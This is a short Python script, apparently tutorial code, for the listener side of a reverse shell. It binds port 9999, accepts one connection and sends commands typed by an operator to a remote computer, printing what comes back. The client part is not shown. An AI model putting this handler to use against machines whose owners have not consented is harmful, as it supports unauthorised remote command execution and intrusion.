import socket
import sys
# this integrates cli and terminal commands

# define some global variables
host: str = ""
port: int = 0
s: socket = socket.socket()

# create a socket
def create_socket():
    global host
    global port
    global s

    # enclose in try/except block to handle connection errors
    try:
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error:' + str(msg))

# bind socket and listening port for connections
def bind_socket():
    global host
    global port
    global s

    try:
        print('Binding the port: ' + str(port))

        s.bind((host, port)) # (host, port) is a tuple - bind host and port
        s.listen(5) # listening for incoming connection

    except socket.error as msg:
        print('Socket binding error' + str(msg) + '\n' + 'Retrying....')
        bind_socket() # restarts function if no connection detected in a loop

# establish connection with a client (socket must be listening "s.listen()"
def accept_connection():
    conn, address = s.accept() # stores connection and a list containing IP address
    print('Connection Established: IP Address ' + address[0] + ' Port: ' + str(address[1]))
    send_commands(conn)

    conn.close() # always close the connection when finished

# send commands to remote computer
def send_commands(conn):
    while True: # start infinite loop so can send commands until done
        cmd = input()
        if cmd == 'quit': # quit to close everything down
            conn.close()
            s.close()
            sys.exit() # this closes the command window

        if len(str.encode(cmd)) > 0: # checking user has typed a command
            conn.send(str.encode(cmd)) # send the command
            response = str(conn.recv(1024), "utf-8") # convert from byte format into string in 1024 byte chunks
            print(response, end="") # end="" goes to new line after printing response

def main():
    create_socket()
    bind_socket()
    accept_connection()

main()
